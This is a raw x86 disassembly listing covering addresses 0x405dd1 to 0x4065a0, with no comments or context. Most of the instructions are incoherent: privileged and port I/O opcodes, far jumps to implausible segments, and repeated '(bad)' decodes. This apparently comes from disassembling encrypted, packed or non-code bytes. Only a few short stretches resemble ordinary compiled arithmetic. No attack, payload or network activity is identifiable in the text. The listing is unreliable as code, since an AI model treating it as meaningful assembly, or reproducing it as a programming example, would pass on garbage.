  405dd1:	dec    esi
  405dd2:	inc    edi
  405dd3:	lods   eax,DWORD PTR ds:[esi]
  405dd4:	push   esp
  405dd5:	pushf  
  405dd6:	lock sbb edx,DWORD PTR [edi+0x19519a4c]
  405ddd:	xor    DWORD PTR [ebx-0x209084d0],edx
  405de3:	inc    ecx
  405de4:	dec    esp
  405de5:	scas   eax,DWORD PTR es:[edi]
  405de6:	jae    0x405d84
  405de8:	retf   
  405de9:	and    eax,0x6deb9363
  405dee:	or     ecx,DWORD PTR [edx]
  405df0:	fwait
  405df1:	stc    
  405df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405df3:	push   ss
  405df4:	push   edi
  405df5:	xor    edi,0xffffffa7
  405df8:	push   edx
  405df9:	mul    dl
  405dfb:	xchg   ebx,eax
  405dfc:	jg     0x405daf
  405dfe:	sbb    al,0x38
  405e00:	push   ds
  405e01:	xchg   DWORD PTR [edi-0x1f6d0278],eax
  405e07:	or     BYTE PTR [edx+esi*4+0x33],dl
  405e0b:	and    edx,DWORD PTR [ecx-0x1ffc0d26]
  405e11:	das    
  405e12:	sbb    DWORD PTR [edx+0x70],edx
  405e15:	popf   
  405e16:	and    al,0x40
  405e18:	ret    0x2d44
  405e1b:	jge    0x405e40
  405e1d:	pop    ebp
  405e1e:	es xor eax,0x2abadf52
  405e24:	dec    esi
  405e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e27:	xchg   esp,eax
  405e28:	nop
  405e29:	loop   0x405e88
  405e2b:	xchg   esi,eax
  405e2c:	popf   
  405e2d:	repz and BYTE PTR [ecx-0x19],bl
  405e31:	adc    al,0x29
  405e33:	(bad)  
  405e34:	jo     0x405dd9
  405e36:	xchg   edi,eax
  405e37:	adc    bh,BYTE PTR [ebp+0x4a]
  405e3a:	int    0xb
  405e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3d:	je     0x405e08
  405e3f:	call   0xfb52:0x6847b056
  405e46:	hlt    
  405e47:	fwait
  405e48:	mov    BYTE PTR [ecx-0x6fcec57],0xe3
  405e4f:	xlat   BYTE PTR ds:[ebx]
  405e50:	retf   
  405e51:	jbe    0x405e1f
  405e53:	mov    ecx,0xda1b153f
  405e58:	das    
  405e59:	cwde   
  405e5a:	pushf  
  405e5b:	outs   dx,DWORD PTR ds:[esi]
  405e5c:	icebp  
  405e5d:	add    esi,DWORD PTR [eax]
  405e5f:	aam    0x78
  405e61:	adc    ecx,esi
  405e63:	jbe    0x405ea0
  405e65:	mov    ch,0x9c
  405e67:	js     0x405e25
  405e69:	aas    
  405e6a:	in     al,0xe
  405e6c:	vmread edx,ebp
  405e6f:	setno  BYTE PTR [esi]
  405e72:	gs stc 
  405e74:	push   ebx
  405e75:	gs pop edi
  405e77:	inc    ebx
  405e78:	int3   
  405e79:	add    eax,0x8401c88a
  405e7e:	mov    edi,0xe8f946f9
  405e83:	pop    edi
  405e84:	xor    al,BYTE PTR [edi-0x3d13bd3c]
  405e8a:	push   eax
  405e8b:	xor    BYTE PTR [ebp-0x53],bh
  405e8e:	mov    ebx,0x1859fd39
  405e93:	pop    ebx
  405e94:	ja     0x405e7a
  405e96:	mov    ds:0xc1ebbe6c,eax
  405e9b:	sub    eax,0x4c8e5147
  405ea0:	xchg   esp,eax
  405ea1:	cs jmp 0x27c3:0x7d7545eb
  405ea9:	push   ss
  405eaa:	pop    eax
  405eab:	and    edi,DWORD PTR [ebx-0x74]
  405eae:	fsub   QWORD PTR [eax-0x3fb67af6]
  405eb4:	mov    ch,0x32
  405eb6:	fsubr  DWORD PTR [edi]
  405eb8:	test   DWORD PTR [esi-0x3a22c639],0xc6b8c161
  405ec2:	jnp    0x405ec8
  405ec4:	cmp    bh,BYTE PTR [edi]
  405ec6:	mov    bl,0x62
  405ec8:	icebp  
  405ec9:	pop    ss
  405eca:	hlt    
  405ecb:	inc    esi
  405ecc:	adc    DWORD PTR [ebp-0x6e],ebp
  405ecf:	xor    esp,ebx
  405ed1:	sti    
  405ed2:	add    edi,DWORD PTR [ebx+eiz*8+0xa]
  405ed6:	in     al,dx
  405ed7:	cld    
  405ed8:	pop    es
  405ed9:	mov    ch,0xf7
  405edb:	scas   al,BYTE PTR es:[edi]
  405edc:	push   esi
  405ede:	adc    DWORD PTR [eax+0x3dbd334c],edx
  405ee4:	xor    BYTE PTR [esi-0x17],al
  405ee7:	int    0x92
  405ee9:	test   eax,0x50d8b404
  405eee:	pop    ds
  405eef:	test   al,0xdc
  405ef1:	(bad)  
  405ef2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  405ef4:	sub    DWORD PTR [ebx+0x70],esi
  405ef7:	pop    esp
  405ef8:	lahf   
  405ef9:	mov    ecx,0x60584f11
  405efe:	fimul  WORD PTR [ebx+ebp*8]
  405f01:	or     BYTE PTR [eax+0x54b7810d],bl
  405f07:	stos   DWORD PTR es:[edi],eax
  405f08:	lahf   
  405f09:	cmp    DWORD PTR [ebp-0xa],edx
  405f0c:	(bad)  
  405f0d:	mov    edx,DWORD PTR [edi+eax*1+0x23]
  405f11:	or     eax,0x2c3b33b7
  405f16:	and    eax,0xf43e509e
  405f1b:	push   esi
  405f1c:	jno    0x405eae
  405f1e:	les    eax,FWORD PTR [ebp-0x1f3d7ed1]
  405f24:	mov    esi,0xc30b89ac
  405f29:	inc    eax
  405f2a:	mov    cl,0x66
  405f2c:	pop    ss
  405f2d:	pushf  
  405f2e:	and    edi,esi
  405f30:	inc    ebp
  405f31:	adc    dl,BYTE PTR [ecx]
  405f33:	sbb    eax,DWORD PTR [eax]
  405f35:	xchg   al,ah
  405f37:	push   es
  405f38:	test   al,0xd1
  405f3a:	jecxz  0x405ee9
  405f3c:	pusha  
  405f3d:	inc    edx
  405f3e:	push   esp
  405f3f:	shr    BYTE PTR [esi],1
  405f41:	mov    al,0x3b
  405f43:	and    al,0x1b
  405f45:	jmp    FWORD PTR [edx]
  405f47:	adc    DWORD PTR [edx+ebp*4+0x3c6fcaae],esp
  405f4e:	fwait
  405f4f:	daa    
  405f50:	pusha  
  405f51:	push   ss
  405f52:	out    0x60,al
  405f54:	pop    edi
  405f55:	pop    ds
  405f56:	fisubr DWORD PTR [eax-0x7d48e86f]
  405f5c:	inc    ecx
  405f5d:	lods   eax,DWORD PTR ds:[esi]
  405f5e:	out    0x9d,eax
  405f60:	xchg   DWORD PTR [ecx],edx
  405f62:	sub    al,0xc2
  405f64:	bound  esi,QWORD PTR [edi]
  405f66:	fs push edi
  405f68:	mov    bl,0xfe
  405f6a:	clc    
  405f6b:	sar    DWORD PTR [edi+0x3b3d3be1],1
  405f71:	mov    edi,0xe0d2f098
  405f76:	je     0x405fa3
  405f78:	sub    ch,dl
  405f7a:	cmp    esi,DWORD PTR [ecx+0x283da52f]
  405f80:	sahf   
  405f81:	int    0x58
  405f83:	push   ss
  405f84:	je     0x405fee
  405f86:	enter  0x6b9f,0x7e
  405f8a:	lods   eax,DWORD PTR ds:[esi]
  405f8b:	lahf   
  405f8c:	loop   0x405fc1
  405f8e:	sub    eax,0xf523818e
  405f93:	fild   QWORD PTR [esi]
  405f95:	mov    ch,0x8c
  405f97:	jb     0x405fbb
  405f99:	cwde   
  405f9a:	xor    DWORD PTR cs:[eax],esi
  405f9d:	cs sbb al,0xde
  405fa0:	lock sub ebp,DWORD PTR [edi+ecx*8-0x2adb183e]
  405fa8:	addr16 stc 
  405faa:	clc    
  405fab:	push   0x4be01e95
  405fb0:	std    
  405fb1:	stc    
  405fb2:	pop    ecx
  405fb3:	loopne 0x406016
  405fb5:	pushf  
  405fb6:	mov    al,ds:0x2cf7829e
  405fbb:	mov    ebx,0x1984151
  405fc0:	out    0xdf,al
  405fc2:	dec    edx
  405fc3:	mov    edi,0x95dfbc3
  405fc8:	cld    
  405fc9:	or     DWORD PTR [esi+0x24462d25],eax
  405fcf:	add    dl,BYTE PTR [edi+0x3d]
  405fd2:	jle    0x40602b
  405fd4:	sub    BYTE PTR [esi],dh
  405fd6:	mov    WORD PTR [esi+0x870c333],gs
  405fdc:	xlat   BYTE PTR ds:[ebx]
  405fdd:	mov    DWORD PTR [edx-0x6c],eax
  405fe0:	jno    0x406039
  405fe2:	pusha  
  405fe3:	sbb    BYTE PTR [edx-0x7191213c],dl
  405fe9:	aam    0x1f
  405feb:	test   al,0xa5
  405fed:	mov    ds:0x4b7c4c62,al
  405ff2:	ins    DWORD PTR es:[edi],dx
  405ff3:	rcl    BYTE PTR es:[ecx+0x24],1
  405ff7:	and    ecx,DWORD PTR [edx-0xe]
  405ffa:	pop    ds
  405ffb:	fisttp DWORD PTR [eax]
  405ffd:	fadd   DWORD PTR [ebx]
  405fff:	and    ch,BYTE PTR [edx]
  406001:	cmp    DWORD PTR [esp+edx*8],esp
  406004:	cld    
  406005:	xchg   esi,eax
  406006:	jno    0x405fee
  406008:	pop    es
  406009:	es and al,0xa5
  40600c:	lea    eax,[eax-0x67d9627c]
  406012:	icebp  
  406013:	loop   0x406081
  406015:	add    BYTE PTR [eax+0x5d],dh
  406018:	and    BYTE PTR [edi],al
  40601a:	ins    DWORD PTR es:[edi],dx
  40601b:	std    
  40601c:	lea    esi,[esi]
  40601e:	sub    DWORD PTR [esp+eiz*8],eax
  406021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406022:	std    
  406023:	(bad)
  406027:	mov    dl,dh
  406029:	enter  0xccf5,0xc
  40602d:	ds jo  0x405ff8
  406030:	push   esi
  406031:	in     al,dx
  406032:	and    ebp,DWORD PTR [ebx+0x78f9b15e]
  406038:	mov    BYTE PTR [ebp-0x79db5fe1],cl
  40603e:	retf   
  40603f:	daa    
  406040:	in     eax,0x18
  406042:	lea    eax,[esi-0x6f]
  406045:	or     cl,cl
  406047:	in     eax,dx
  406048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40604a:	mul    BYTE PTR [eax]
  40604c:	cmc    
  40604d:	jle    0x406083
  40604f:	ds out 0x17,al
  406052:	or     al,dh
  406054:	es inc eax
  406056:	adc    ebx,ecx
  406058:	sbb    ebx,ebp
  40605a:	push   ds
  40605b:	xchg   esi,eax
  40605c:	(bad)  
  40605d:	sti    
  40605e:	ja     0x405ffc
  406060:	repz mov eax,ds:0x801bfc5f
  406066:	mov    BYTE PTR [ebx],cl
  406068:	sbb    DWORD PTR ds:0x675e0402,esp
  40606e:	outs   dx,BYTE PTR ds:[esi]
  40606f:	pop    ebx
  406070:	popf   
  406071:	fidivr DWORD PTR [edx]
  406073:	cli    
  406074:	mov    al,0x28
  406076:	clc    
  406077:	jo     0x406033
  406079:	xchg   edx,eax
  40607a:	jae    0x406098
  40607c:	jo     0x40608c
  40607e:	sub    al,0xf
  406080:	pop    edi
  406081:	ror    BYTE PTR [edi-0x172d7760],cl
  406087:	sbb    DWORD PTR [ebp-0x2d],eax
  40608a:	add    dh,BYTE PTR [ecx+0x381c4f79]
  406090:	mov    bh,0xf9
  406092:	test   eax,0xa2a6ca5b
  406097:	ins    DWORD PTR es:[edi],dx
  406098:	dec    ebx
  406099:	jle    0x4060db
  40609b:	jae    0x406117
  40609d:	shl    DWORD PTR [eax],1
  40609f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060a0:	cmp    esi,DWORD PTR [edx]
  4060a2:	clc    
  4060a3:	call   0xc0c7:0xfa341f42
  4060aa:	xchg   edi,eax
  4060ab:	ins    DWORD PTR es:[edi],dx
  4060ac:	mov    WORD PTR [ebp+0x90296fb],es
  4060b2:	and    DWORD PTR [edi+ebp*1-0x22bddd0d],edx
  4060b9:	dec    ebp
  4060ba:	push   ss
  4060bb:	cmp    al,0xa2
  4060bd:	xchg   ebp,eax
  4060be:	mov    ecx,0x1df624e8
  4060c3:	inc    esi
  4060c4:	jecxz  0x4060d2
  4060c6:	add    al,0xd4
  4060c8:	pop    ax
  4060ca:	mov    cl,0x7a
  4060cc:	out    dx,al
  4060cd:	sub    bh,0x15
  4060d0:	and    ebp,ebx
  4060d2:	ret    0xa964
  4060d5:	mov    ebp,0xb0bcd19a
  4060da:	lods   eax,DWORD PTR ds:[esi]
  4060db:	xchg   DWORD PTR [ecx+0x0],edi
  4060de:	addr16 xor esi,esp
  4060e1:	jbe    0x406122
  4060e3:	repz ss je 0x4060e0
  4060e7:	enter  0x5023,0x68
  4060eb:	test   eax,0x2a96d306
  4060f0:	push   ebx
  4060f1:	nop
  4060f2:	mov    edi,0x6b23193
  4060f7:	lea    eax,[ebp+eax*1-0x4]
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	xor    ecx,DWORD PTR [edi]
  40612e:	xchg   ebp,eax
  40612f:	mov    esp,0x1818a378
  406134:	sahf   
  406135:	adc    bl,BYTE PTR [eax]
  406137:	sbb    BYTE PTR [ecx+0x3],bl
  40613a:	add    bh,bl
  40613c:	aas    
  40613d:	das    
  40613e:	pop    ds
  40613f:	xchg   esi,eax
  406140:	jae    0x406178
  406142:	xor    eax,0x744bfa3d
  406147:	(bad)  
  406148:	push   0x70
  40614a:	jo     0x40611f
  40614c:	pop    edi
  40614d:	push   0x1139ea71
  406152:	mov    edx,0x67684f06
  406157:	jmp    0x77af5d42
  40615c:	xor    bl,BYTE PTR [ebx-0xc45900a]
  406162:	cmovp  edi,DWORD PTR [eax-0x2790d0d2]
  406169:	jae    0x4061c8
  40616b:	dec    ebx
  40616c:	adc    al,0x46
  40616e:	fisttp WORD PTR [edx+0x3ac3af08]
  406174:	dec    eax
  406175:	fwait
  406176:	push   ds
  406177:	add    al,0x1e
  406179:	lea    ebp,[esi+0x4f]
  40617c:	jmp    0xaba45d3e
  406181:	mov    edi,0x57f68aed
  406186:	rol    DWORD PTR ds:[ebx-0x7f2e6629],1
  40618d:	and    al,0x9d
  40618f:	mov    edx,0x3cbf01ec
  406194:	mov    al,ds:0xb314b592
  406199:	sub    al,0x3d
  40619b:	in     al,0xf4
  40619d:	mov    edx,0x656c67b5
  4061a2:	sbb    eax,0x8a55d2c
  4061a7:	cmp    DWORD PTR [ebp+0x70],eax
  4061aa:	dec    eax
  4061ab:	dec    DWORD PTR [ebx]
  4061ad:	mov    eax,ds:0x6cb35c57
  4061b2:	mov    cl,0x10
  4061b4:	and    bl,dl
  4061b6:	ficomp DWORD PTR [eax+esi*1+0x1f]
  4061ba:	(bad)  
  4061bb:	mov    edx,0x7defd484
  4061c0:	cs out 0xb8,eax
  4061c3:	adc    BYTE PTR [edi-0x1a],0x62
  4061c7:	cmp    eax,0x99d341e6
  4061cc:	push   ecx
  4061cd:	mov    ds:0x9bbe5305,al
  4061d2:	jg     0x406227
  4061d4:	mov    al,ds:0x1fab0aff
  4061d9:	jns    0x406227
  4061db:	imul   ecx,DWORD PTR [ebp+ecx*4-0x77fc672e],0xfd483aef
  4061e6:	push   edi
  4061e7:	lods   eax,DWORD PTR ds:[esi]
  4061e8:	fild   WORD PTR [ecx+eax*8]
  4061eb:	pop    ecx
  4061ec:	fldcw  WORD PTR [eax-0x3f]
  4061ef:	cs add eax,0x21397ff5
  4061f5:	int    0x11
  4061f7:	or     ah,BYTE PTR [edx-0x64c3ee17]
  4061fd:	adc    al,0xe1
  4061ff:	shl    BYTE PTR [edi+0x69173ea8],1
  406205:	cmp    DWORD PTR [ebx+0x79],ecx
  406208:	repz dec ebx
  40620a:	push   0xffffff9a
  40620c:	les    eax,FWORD PTR [ecx+0x3fa922f0]
  406212:	jecxz  0x40619b
  406214:	sub    al,0x5e
  406216:	bound  eax,QWORD PTR [edx-0x48b4b82f]
  40621c:	push   edx
  40621d:	sbb    al,0xe8
  40621f:	cwde   
  406220:	sbb    al,0xe1
  406222:	stos   BYTE PTR es:[edi],al
  406223:	into   
  406224:	gs out dx,al
  406226:	inc    eax
  406227:	repnz mov WORD PTR [edx+0x57],?
  40622b:	(bad)  
  40622c:	sbb    DWORD PTR [ebp+0x65],ecx
  40622f:	(bad)  
  406230:	js     0x4061e3
  406232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406233:	lods   al,BYTE PTR ds:[esi]
  406234:	mov    al,BYTE PTR [edx+eiz*1]
  406237:	sub    BYTE PTR [ebp-0x13e7e7b8],dh
  40623d:	xor    ebx,DWORD PTR ds:0xf8b9b111
  406243:	jmp    0x842c:0x5bb66dbe
  40624a:	addr16 in al,dx
  40624c:	mov    ch,0xff
  40624e:	xchg   edx,eax
  40624f:	pop    ss
  406250:	mov    esi,0xd341ab62
  406255:	mov    dl,BYTE PTR [esi]
  406257:	add    eax,0x7d83445b
  40625c:	pop    esp
  40625d:	ror    DWORD PTR [edx+0x13],1
  406260:	push   eax
  406261:	lods   eax,DWORD PTR ds:[esi]
  406262:	cmp    al,0x96
  406264:	imul   edi,DWORD PTR [ecx+edx*4],0xafb0e648
  40626b:	imul   DWORD PTR [eax+0x319ffaf6]
  406271:	mov    edx,0x5639082c
  406276:	push   edi
  406277:	add    DWORD PTR [ebp-0x37],ebp
  40627a:	or     al,0x45
  40627c:	and    al,0x71
  40627e:	jb     0x40629e
  406280:	cvtpi2ps xmm0,QWORD PTR [ebx+0x4]
  406284:	push   ds
  406285:	push   ebp
  406286:	push   esi
  406287:	mov    edx,0x1d453160
  40628c:	into   
  40628d:	test   al,0xdb
  40628f:	inc    ebp
  406290:	call   0x726a7511
  406295:	jmp    0xbeb8:0x970039df
  40629c:	pop    edx
  40629d:	dec    esi
  40629e:	jle    0x4062d4
  4062a0:	imul   edi,eax,0x33
  4062a3:	es sub al,0x55
  4062a6:	int3   
  4062a7:	sbb    cl,BYTE PTR [edi-0x27]
  4062aa:	bound  esp,QWORD PTR fs:0x9d4db9c1
  4062b1:	sub    BYTE PTR [ebx-0x24],ah
  4062b4:	sbb    DWORD PTR [edx+0x2837c8a2],0x7f
  4062bb:	stos   BYTE PTR es:[edi],al
  4062bc:	add    BYTE PTR [eax],ah
  4062be:	push   ecx
  4062bf:	or     DWORD PTR [edi+ecx*2+0x1b],edi
  4062c3:	not    ah
  4062c5:	stos   DWORD PTR es:[edi],eax
  4062c6:	(bad)  
  4062c7:	or     eax,0xbafdc75d
  4062cc:	push   esp
  4062cd:	scas   al,BYTE PTR es:[edi]
  4062ce:	cmp    cl,BYTE PTR ds:[esi+0x71]
  4062d2:	jmp    0x371b5d0
  4062d7:	inc    edx
  4062d8:	outs   dx,DWORD PTR ds:[esi]
  4062d9:	dec    ebp
  4062da:	loopne 0x406317
  4062dc:	(bad)  
  4062dd:	loopne 0x4062ef
  4062df:	jle    0x40630e
  4062e1:	mov    DWORD PTR [edx+0x1b],ebp
  4062e4:	mov    al,0x6b
  4062e6:	mov    edx,0x8ef80971
  4062eb:	ror    esi,0x94
  4062ee:	ja     0x406273
  4062f0:	pop    eax
  4062f1:	pop    esi
  4062f2:	push   edi
  4062f3:	jmp    0x82097200
  4062f8:	in     al,0xfa
  4062fa:	iret   
  4062fb:	in     eax,0xe3
  4062fd:	stos   DWORD PTR es:[edi],eax
  4062fe:	dec    edx
  4062ff:	das    
  406300:	imul   esp,DWORD PTR [edx-0x79],0xa57cb59c
  406307:	cli    
  406308:	daa    
  406309:	addr16 adc eax,0x78e50773
  40630f:	sub    eax,0x5d142448
  406314:	cmp    BYTE PTR [ebx+0x37ddbd8d],ch
  40631a:	xor    eax,DWORD PTR [edx-0xccc3b51]
  406320:	mov    eax,ds:0x15cc1ae6
  406325:	fdivr  DWORD PTR [edx-0x65a1be53]
  40632b:	lock out 0xd1,eax
  40632e:	imul   ebp,DWORD PTR [eax-0x1b],0x4150f630
  406335:	std    
  406336:	or     esp,DWORD PTR [edi+0x16]
  406339:	inc    edi
  40633a:	xchg   DWORD PTR ds:0x55f7bae5,ebx
  406340:	or     ch,ah
  406342:	jae    0x406396
  406344:	outs   dx,DWORD PTR ds:[esi]
  406345:	loop   0x406369
  406347:	(bad)  
  406348:	mov    dh,BYTE PTR [eax-0x56]
  40634b:	scas   eax,DWORD PTR es:[edi]
  40634c:	adc    al,0xa1
  40634e:	imul   DWORD PTR [esi-0x7c]
  406351:	rcl    DWORD PTR [ebp+0x34],cl
  406354:	cmp    esi,DWORD PTR es:[eax-0x760f3e15]
  40635b:	dec    edi
  40635c:	test   DWORD PTR [ebx-0x785c2162],ebp
  406362:	cmp    edx,DWORD PTR [ebx+0x6d9005eb]
  406368:	dec    ebp
  406369:	mov    ds:0xb4093997,eax
  40636e:	push   DWORD PTR [edi+eiz*4]
  406371:	(bad)  [edi]
  406373:	sbb    edx,DWORD PTR [eax]
  406375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406376:	cld    
  406377:	sbb    edx,0x9
  40637a:	jp     0x406353
  40637c:	mov    eax,fs:0xcdffc45d
  406382:	stos   BYTE PTR es:[edi],al
  406383:	or     ebp,ebx
  406385:	or     edi,esi
  406387:	(bad)  
  406388:	pop    edi
  406389:	cli    
  40638a:	aas    
  40638b:	xor    eax,0xcfacc89b
  406390:	imul   eax,DWORD PTR [edx],0x54
  406393:	pop    esi
  406394:	jae    0x406335
  406396:	in     eax,dx
  406397:	mov    bh,0x79
  406399:	mov    ds:0x6f2e9915,eax
  40639e:	pop    edi
  40639f:	xchg   edi,eax
  4063a0:	das    
  4063a1:	add    DWORD PTR gs:[eax-0x74],edx
  4063a5:	pop    eax
  4063a6:	jle    0x4063ad
  4063a8:	inc    ecx
  4063a9:	(bad)  
  4063aa:	es mov dh,0x78
  4063ad:	popa   
  4063ae:	jns    0x406379
  4063b0:	push   ecx
  4063b1:	adc    DWORD PTR [eax],edx
  4063b3:	ss xchg esi,eax
  4063b5:	push   esp
  4063b6:	scas   eax,DWORD PTR es:[edi]
  4063b7:	fs xchg esp,eax
  4063b9:	enter  0xd908,0x67
  4063bd:	sahf   
  4063be:	dec    eax
  4063bf:	cmp    esp,DWORD PTR [edi+0x59]
  4063c2:	sub    ch,ah
  4063c4:	inc    ebx
  4063c5:	add    al,0x65
  4063c7:	int3   
  4063c8:	dec    ebx
  4063c9:	add    BYTE PTR [ebx+0x74351419],0xda
  4063d0:	arpl   WORD PTR [esi],di
  4063d2:	sbb    al,bl
  4063d4:	adc    DWORD PTR [edi-0x2b],esi
  4063d7:	xchg   esi,eax
  4063d8:	jecxz  0x406360
  4063da:	lds    edx,FWORD PTR [edx+eiz*1]
  4063dd:	mov    bl,0x89
  4063df:	ja     0x406435
  4063e1:	push   edi
  4063e2:	xchg   ebp,eax
  4063e3:	add    ah,al
  4063e5:	fdivr  QWORD PTR [edx-0x45ddccc0]
  4063eb:	and    edi,DWORD PTR [edx+esi*1+0x42111e1e]
  4063f2:	add    DWORD PTR [esi+0x2ddf1edd],edi
  4063f8:	jle    0x4063ae
  4063fa:	mov    ah,0xb9
  4063fc:	inc    ebp
  4063fd:	and    al,BYTE PTR [edi+0x2b]
  406400:	aad    0xfe
  406402:	stc    
  406403:	xor    dl,BYTE PTR [edi]
  406405:	popa   
  406406:	pop    esi
  406407:	fnstsw WORD PTR [esi+0x4d]
  40640a:	push   esp
  40640b:	jmp    0x406402
  40640d:	and    eax,0x7548b065
  406412:	call   0xe2ae1d8b
  406417:	push   ss
  406418:	jp     0x4063fa
  40641a:	imul   ebp,DWORD PTR [edi],0x261fccd7
  406420:	hlt    
  406421:	stos   BYTE PTR es:[edi],al
  406422:	and    eax,0x75351e99
  406427:	xchg   ebx,eax
  406428:	xor    BYTE PTR [esp+edx*4-0x3a5f0f58],ch
  40642f:	push   es
  406430:	and    BYTE PTR [esi],ch
  406432:	push   0x34
  406434:	pop    edi
  406435:	or     al,BYTE PTR [edx]
  406437:	imul   ebx,DWORD PTR [esi+0x76bc5818],0xe654a67a
  406441:	ins    BYTE PTR es:[edi],dx
  406442:	stos   BYTE PTR es:[edi],al
  406443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406444:	out    dx,eax
  406445:	ds xchg esi,eax
  406447:	dec    edx
  406448:	and    BYTE PTR [ebx],al
  40644a:	sbb    dh,BYTE PTR [eax+0x46a86a72]
  406450:	xchg   ecx,eax
  406451:	pop    ds
  406452:	pusha  
  406453:	imul   esp,DWORD PTR [esi],0x22
  406456:	push   cs
  406457:	pop    ebx
  406458:	mov    bl,cl
  40645a:	addr16 push edx
  40645c:	aam    0x5d
  40645e:	cmp    DWORD PTR [ebp-0x69],0xffffffdb
  406462:	sbb    DWORD PTR [ebx+0x1],eax
  406465:	shr    DWORD PTR [eax],cl
  406467:	repz ret 0x3047
  40646b:	cdq    
  40646c:	ins    DWORD PTR es:[edi],dx
  40646d:	in     eax,0x81
  40646f:	push   esi
  406470:	cs push es
  406472:	lods   al,BYTE PTR ds:[esi]
  406473:	adc    dl,BYTE PTR [esi]
  406475:	retf   0x99be
  406478:	mov    ds,esp
  40647a:	mov    ebp,0x22c60335
  40647f:	lds    esi,FWORD PTR [ebx+0x5b]
  406482:	mov    dl,0xe3
  406484:	push   es
  406485:	and    al,0x9f
  406487:	shl    BYTE PTR [edi-0x755f97b4],cl
  40648d:	fidiv  WORD PTR [esi]
  40648f:	mov    esi,0x4a52d42b
  406494:	fidiv  DWORD PTR [edx-0x5fad976f]
  40649a:	sbb    cl,0xef
  40649d:	mov    ebp,0xf903b5d5
  4064a2:	lods   al,BYTE PTR ds:[esi]
  4064a3:	mov    ah,0xeb
  4064a5:	pop    ds
  4064a6:	in     eax,0x6a
  4064a8:	xchg   edx,eax
  4064a9:	dec    edi
  4064aa:	retf   0x21ef
  4064ad:	imul   ecx,DWORD PTR [ebx-0x5f],0xffffffaa
  4064b1:	cdq    
  4064b2:	test   al,0xb0
  4064b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064b5:	je     0x4064ad
  4064b7:	enter  0xffc6,0xfe
  4064bb:	aad    0x15
  4064bd:	push   ecx
  4064be:	xchg   ebp,eax
  4064bf:	xlat   BYTE PTR ds:[ebx]
  4064c1:	inc    eax
  4064c2:	push   ss
  4064c3:	mov    esi,0x6e687416
  4064c8:	push   esi
  4064c9:	push   ss
  4064ca:	fcmovnb st,st(1)
  4064cc:	dec    ecx
  4064cd:	loope  0x40647a
  4064cf:	enter  0xda19,0x97
  4064d3:	adc    BYTE PTR [ebp+0x5ba9187e],0x91
  4064da:	sahf   
  4064db:	jmp    0xe81424b0
  4064e0:	mov    ebp,0xef39846d
  4064e5:	xor    al,ch
  4064e7:	pop    edx
  4064e8:	push   cs
  4064e9:	das    
  4064ea:	mov    ebp,0x99314063
  4064ef:	mov    ebp,ebx
  4064f1:	mov    esi,0xaa0f619d
  4064f6:	xor    al,0x8e
  4064f8:	mov    ebx,0xc8ac20b
  4064fd:	or     BYTE PTR [ebx+0x830cc45],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x439aac00],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	loopne 0x406544
  406558:	aas    
  406559:	(bad)  
  40655b:	(bad)  
  40655d:	adc    esp,DWORD PTR [ebp-0x43ea48be]
  406563:	xchg   edx,eax
  406564:	add    BYTE PTR [ebx+0x429cf37f],dh
  40656a:	xor    al,0xb5
  40656c:	je     0x4065ab
  40656e:	xor    al,0x5c
  406570:	xor    BYTE PTR [ebx+0x23b2464e],dh
  406576:	push   0xe43783b2
  40657b:	lgdtd  [ebp-0x3c]
  40657f:	mov    BYTE PTR ds:0x1bd0c04f,0xcc
  406586:	pop    ecx
  406587:	(bad)  
  406588:	stc    
  406589:	adc    DWORD PTR [edi],esp
  40658b:	lods   al,BYTE PTR ds:[esi]
  40658c:	xchg   ebx,eax
  40658d:	push   esi
  40658e:	repz cmp DWORD PTR [edi+0x5af6477d],eax
  406595:	xlat   BYTE PTR ds:[ebx]
  406596:	icebp  
  406597:	dec    eax
  406598:	ror    DWORD PTR [ebx+ebp*4+0x1cf59dcc],cl
  40659f:	(bad)  
  4065a0:	stos   DWORD PTR es:[edi],eax
